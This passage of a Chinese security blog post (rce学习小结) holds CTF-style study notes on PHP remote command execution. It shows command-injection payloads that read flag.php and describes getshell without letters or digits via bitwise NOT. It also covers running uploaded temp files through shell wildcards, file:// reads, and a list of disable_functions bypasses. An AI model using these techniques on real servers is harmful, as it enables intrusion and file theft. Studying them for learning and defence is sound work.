+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php||</span><br><span class="line">cat flag.php;</span><br></pre></td></tr></table></figure>
+
+<h2 id="无字母数字getshell"><a href="#无字母数字getshell" class="headerlink" title="无字母数字getshell"></a>无字母数字getshell</h2><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>在php中~代表取反操作</p>
+<p>即假设有10011000的二进制，那么~10011000 == 01100111</p>
+<p>这样取反后会得到一串无意义的字符，只要在执行命令时在这串字符前同样加取反符，就可以达成执行命令的目的</p>
+<h3 id="通配符文件执行"><a href="#通配符文件执行" class="headerlink" title="通配符文件执行"></a>通配符文件执行</h3><p>shell中可以使用点来执行文件，如<code>. 1.txt</code></p>
+<p>在存在命令执行的情况下，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
+<p>这个文件中写入我们需要执行的命令</p>
+<ul>
+<li><p>通配符</p>
+<blockquote>
+<p><code>*</code> 表示全部的字符</p>
+<p><code>?</code>表示一个字符</p>
+<p><code>[^a]</code>表示除a外</p>
+</blockquote>
+</li>
+</ul>
+<p>只要构造出符合要求的文件，就可以执行成功</p>
+<p><img src="image-20210530112228861.png" alt="image-20210530112228861"></p>
+<p>大致就是这个意思</p>
+<p>文件中无命令，也可以直接读取内容</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file-文件读取协议"><a href="#file-文件读取协议" class="headerlink" title="file:// 文件读取协议"></a>file:// 文件读取协议</h3><p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl file://【文件绝对路径】</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210530095202808.png" alt="image-20210530095202808"></p>
+<h2 id="phpinfo-之disable-functions"><a href="#phpinfo-之disable-functions" class="headerlink" title="phpinfo()之disable_functions"></a>phpinfo()之disable_functions</h2><p>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</p>
+<h3 id="绕过方式分类"><a href="#绕过方式分类" class="headerlink" title="绕过方式分类"></a><strong>绕过方式分类</strong></h3><ul>
+<li>常规绕过：exec,shell_exec,system,passthru,popen,proc_open</li>
+<li>利用环境变量LD_PRELOAD绕过(★)：mail,imap_mail,error_log,mb_send_mail</li>
+<li>利用pcntl_exec绕过</li>
+<li>利用imap_open函数任意命令执行(CVE-2018-19518)</li>
+<li>利用系统组件window com绕过</li>
+<li>利用Apache+mod_cgi+.htaccess绕过</li>
+<li>利用ImageMagick漏洞绕过利用PHP7.4的FFI绕过</li>
+<li>利用 ShellShock绕过(CVE-2014-6271)</li>
+<li>蚁剑插件</li>
+</ul>
+<h1 id="特别鸣谢："><a href="#特别鸣谢：" class="headerlink" title="特别鸣谢："></a><strong>特别鸣谢：</strong></h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/107676580">https://blog.csdn.net/qq_44657899/article/details/107676580</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/162128">https://www.anquanke.com/post/id/162128</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Atmujie</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://atmujie.github.io/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">http://atmujie.github.io/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Atmujie</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+        <div class="disqus-card card" data-aos="fade-up">
+    <div id="disqus_thread" class="card-content">
+        <noscript>Please enable JavaScript to view the
+            <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+    </div>
+</div>
+
+<script type="text/javascript">
+    disqus_config = function () {
+        this.page.url = 'http://atmujie.github.io/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/';
+        this.page.identifier = '/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/';
+        this.page.title = 'rce学习小结';
+    };
+    let disqus_shortname = '';
+
+    (function () { // DON'T EDIT BELOW THIS LINE
+        let d = document, s = d.createElement('script');
+        // 如：s.src = 'https://blinkfox.disqus.com/embed.js';
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'GHiPEgESACHszUJMqTqLWQtF-gzGzoHsz',
+        appKey: 'Lm6vLWBnRM3KIlhuo4tqDNDq',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="rce学习小结">
+                        
+                        <span class="card-title">rce学习小结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/05/19/upload%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="upload-labs通关笔记">
+                        
+                        <span class="card-title">upload-labs通关笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">Atmujie</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/atmujie" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
